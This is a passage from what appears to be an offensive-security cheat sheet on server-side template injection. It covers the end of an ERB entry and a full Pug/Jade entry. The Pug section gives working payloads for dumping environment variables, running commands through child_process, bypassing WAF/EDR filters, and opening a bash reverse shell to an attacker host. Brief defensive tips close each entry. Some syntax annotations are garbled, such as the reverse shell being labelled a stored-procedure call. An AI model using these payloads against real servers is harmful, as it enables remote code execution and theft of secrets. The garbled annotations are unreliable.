**Vulnerability Principle:** ERB SSTI executes Ruby expressions via the <%= %> tag and Ruby statements via the <% %> tag. An attacker can directly call system()/exec()/IO.popen()/backticks to execute system commands, or use the File class to read and write server files, and the exploit chain is extremely simple and direct.

**Exploitation Method:** Complete exploitation flow:
1. Probe for a template injection point
2. Confirm the ERB engine
3. Use backticks to execute a command
4. Obtain a shell

**Defensive Measures:** Defenses:
1. Do not render user input directly into the template
2. Use a secure template engine
3. Restrict template functionality
4. Input validation and filtering

---

### Pug/Jade Template Injection  `ssti-pug`
_Pug/Jade template engine injection attack techniques_
Subcategory: **Pug** · tags: `ssti` `pug` `jade` `nodejs` `template`

**Prerequisites:**
- Uses the Pug/Jade template engine
- User input is rendered directly into the template

**Attack Chain:**

**1. Probe for SSTI**
> Probe for Pug template injection
```
#{7*7}
#{this}
#{global}
If it outputs 49 or the global object, SSTI exists
```
**Syntax breakdown:**
- `#{` — Pug interpolation syntax _value_
- `7*7` — math expression _value_
- `}` — end of interpolation _value_

**2. Information gathering**
> Gather environment information
```
#{process}
#{process.env}
#{global.process}
#{require}
```
**Syntax breakdown:**
- `process` — Node.js process object _value_
- `process.env` — environment variables _path_
- `global` — global object _value_

**3. Command execution - child_process**
> Use child_process to run a command
```
- var exec = require("child_process").exec
#{exec("id", function(err, stdout, stderr) { console.log(stdout) })}
- require("child_process").exec("id")
```
**Syntax breakdown:**
- `-` — Pug JavaScript code line _operator_
- `require` — Node.js module loading _value_
- `child_process` — subprocess module _value_

**4. Command execution - execSync**
> Use execSync to run a command
```
- var execSync = require("child_process").execSync
#{execSync("id").toString()}
#{require("child_process").execSync("id").toString()}
```
**Syntax breakdown:**
- `execSync` — synchronously execute a command _value_
- `toString()` — convert Buffer to string _function_

**5. Reverse shell**
> Obtain a reverse shell
_platform: linux_
```
- require("child_process").exec("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"")
```
**Syntax breakdown:**
- `EXEC` — execute a stored procedure _keyword_

**WAF/EDR Bypass Variants:**

**String concatenation**
> Bypass using string concatenation
```
- var cmd = "i" + "d"
#{require("child_process").execSync(cmd).toString()}
- var r = "require"
#{global[r]("child_process")}
```

**Use global**
> Use the global object
```
#{global.process.mainModule.require("child_process").execSync("id").toString()}
#{global["req"+"uire"]("child_process")}
```
**Syntax breakdown:**
- `mainModule` — Node.js main module _value_
- `require` — module loading function _value_

**Use this**
> Use this.constructor
```
#{this.constructor.constructor("return process")().mainModule.require("child_process").execSync("id")}
```
**Syntax breakdown:**
- `#this.constructor.constructorreturn` — command/keyword _command_

**Overview:** Pug (formerly Jade) is the most popular template engine in the Node.js ecosystem. Its SSTI vulnerability can directly access the Node.js runtime environment via JavaScript code injection, using require() or the child_process module to execute system commands.

**Vulnerability Principle:** Pug SSTI executes JavaScript via an unfiltered interpolation expression (#{expression}) or a code block (-/= prefix). An attacker can use global.process.mainModule.require to import the child_process module, or dynamically create a Function to execute code via the constructor chain (this.constructor.constructor).

**Exploitation Method:** Complete exploitation flow:
1. Probe for a template injection point
2. Confirm the Pug engine
3. Use require to load child_process
4. Execute a system command

**Defensive Measures:** Defenses:
1. Do not render user input directly into the template
2. Disable require access
3. Use a sandbox environment
4. Input validation and filtering

---
